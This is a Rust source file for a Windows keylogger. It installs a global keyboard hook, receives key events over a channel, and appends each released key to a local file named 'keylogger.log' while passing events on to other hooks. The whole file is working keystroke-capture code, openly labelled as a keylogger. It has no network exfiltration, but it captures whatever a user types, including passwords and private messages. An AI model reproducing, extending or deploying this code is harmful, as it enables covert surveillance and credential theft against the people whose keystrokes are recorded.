mod event;
mod hook;
mod safe_winapi;

use std::{error::Error, fs, io::Write, sync::mpsc};

use event::{KeyAction, KeyEvent, NativeEventOperation};
use hook::HookHandler;

use windows::Win32::{
    Foundation::{LPARAM, LRESULT, WPARAM},
    UI::WindowsAndMessaging::{CallNextHookEx, HHOOK},
};

use once_cell::{self, sync::Lazy};

static HOOK_HANDLER: Lazy<HookHandler> = Lazy::new(HookHandler::new);

fn main() -> Result<(), Box<dyn Error>> {
    let (tx, rx) = mpsc::channel();

    HOOK_HANDLER.install(tx, keyboard_hook_proc);

    let mut file = fs::OpenOptions::new()
        .append(true)
        .create(true)
        .open("keylogger.log")?;

    while let Ok(value) = rx.recv() {
        match value {
            KeyEvent {
                // Key to write
                target,
                action: KeyAction::Release,
            } => {
                file.write_all((target as u8 as char).to_string().as_bytes())
                    .unwrap();
            }
            KeyEvent {
                // No key to write such as CTRL, SHIFT, ...
                target: _,
                action: _,
            } => {}
        };
    }

    HOOK_HANDLER.uninstall();
    Ok(())
}

extern "system" fn keyboard_hook_proc(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    match hook::keyboard_hook_proc_inner(&HOOK_HANDLER, n_code, l_param) {
        NativeEventOperation::Block => LRESULT(1),
        NativeEventOperation::Dispatch => unsafe {
            CallNextHookEx(HHOOK(0), n_code, w_param, l_param)
        },
    }
}
